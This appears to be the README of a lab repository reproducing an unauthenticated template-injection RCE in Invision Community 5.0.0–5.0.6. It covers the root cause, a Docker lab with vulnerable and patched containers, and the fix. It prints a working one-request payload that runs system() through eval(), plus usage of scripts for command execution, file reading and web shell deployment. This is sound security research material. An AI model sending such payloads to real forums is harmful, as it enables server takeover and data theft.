# CVE-2025-47916: Invision Community Unauthenticated RCE via Template Injection

## Overview

| Field | Details |
|---|---|
| **CVE** | [CVE-2025-47916](https://nvd.nist.gov/vuln/detail/CVE-2025-47916) |
| **Vendor** | Invision Power Services |
| **Product** | [Invision Community](https://invisioncommunity.com) |
| **Affected** | 5.0.0 through 5.0.6 |
| **Fixed** | 5.0.7 (May 12, 2025) |
| **Type** | Server-Side Template Injection (CWE-94, CWE-1336) |
| **CVSS** | 10.0 Critical — `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| **EPSS** | 90.0% (99.6th percentile) — actively exploited in the wild |
| **Author** | [Exploit Intelligence Platform](https://exploit-intel.com) |

## Root Cause

The `customCss()` method in `themeeditor.php` is accessible to unauthenticated users via the IPS URL routing mechanism. It passes the `content` POST parameter directly to `Theme::makeProcessFunction()`, which compiles `{expression="..."}` template tags into PHP code and evaluates them via `eval()`. No authentication check, CSRF validation, or input sanitization protects this endpoint in versions 5.0.0–5.0.6.

```
POST /index.php
app=core&module=system&controller=themeeditor&do=customCss
content={expression="die('________'.system(base64_decode('aWQ=')))"}
```

**No authentication required. Single HTTP request. CVSS 10.0.**

## Lab Setup

### Prerequisites

- Docker and Docker Compose installed

### Build and Start

```bash
docker compose build
docker compose up -d
```

### Containers

| Container | Role | Port |
|---|---|---|
| `cve-2025-47916-vulnerable` | Invision Community 5.0.6 (synthetic) | 8080 |
| `cve-2025-47916-patched` | Invision Community 5.0.7 (synthetic, fixed) | 8081 |

Both containers use a synthetic PHP application that faithfully reproduces the vulnerability mechanics since Invision Community is proprietary commercial software.

### Stop Lab

```bash
docker compose down
```

## PoC Usage

Three PoC scripts in `poc/`, all Python 3 stdlib only.

### Vector 1: OS Command Execution (`poc.py`)

```bash
python3 poc/poc.py localhost 8080
python3 poc/poc.py localhost 8080 -c "uname -a"
python3 poc/poc.py localhost 8080 --check-only
```

**Expected output:**
```
[+] Detected version: IPS 5.0.6 (VULNERABLE)
[+] Template injection CONFIRMED — target is exploitable!

─── Command Output ───
uid=33(www-data) gid=33(www-data) groups=33(www-data)
──────────────────────

[+] EXPLOITATION SUCCESSFUL — Remote Code Execution confirmed
```

### Vector 2: PHP Eval (Metasploit-style) (`poc_vector2.py`)

```bash
python3 poc/poc_vector2.py localhost 8080
python3 poc/poc_vector2.py localhost 8080 --php-code "phpinfo();"
```

Demonstrates PHP environment disclosure, arbitrary file read (`/etc/passwd`), directory listing, and configuration enumeration.

### Vector 3: Web Shell Deployment (`poc_vector3.py`)

```bash
python3 poc/poc_vector3.py localhost 8080
```

Deploys a persistent web shell via `file_put_contents()`, executes commands through it, then cleans up via `unlink()`.

## Verification

| Test | Vulnerable (5.0.6, :8080) | Patched (5.0.7, :8081) |
|---|---|---|
| `poc.py` — OS command via `system()` | RCE confirmed (`uid=33(www-data)`) | Blocked (template injection check fails) |
| `poc_vector2.py` — PHP eval | PHP eval confirmed | Blocked (HTTP 403) |
| `poc_vector3.py` — Web shell deployment | Web shell deployed and verified | Blocked (HTTP 403) |

## Fix

Version 5.0.7 adds an authentication/authorization check to `customCss()` — unauthenticated users receive HTTP 403. Additionally, `{expression="..."}` template tags are stripped from user-supplied content as defense in depth. The fix is assessed as **complete** — no bypass vectors were identified.

## References

| Source | Link |
|---|---|
| **Vendor Release Notes** | [5.0.7](https://invisioncommunity.com/release-notes-v5/507-r41/) |
| **Original Advisory** | [KIS-2025-02](https://karmainsecurity.com/KIS-2025-02) |
| **NVD** | [CVE-2025-47916](https://nvd.nist.gov/vuln/detail/CVE-2025-47916) |
| **ExploitDB** | [EDB-52294](https://www.exploit-db.com/exploits/52294) |
| **Metasploit** | [invision_customcss_rce.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/invision_customcss_rce.rb) |

## Disclaimer

This proof-of-concept is provided for **authorized security research and educational purposes only**. The synthetic vulnerable application reproduces the vulnerability mechanics for study in an isolated lab environment — it does not contain the actual proprietary Invision Community software. Do not use against systems you do not own or have explicit written authorization to test.
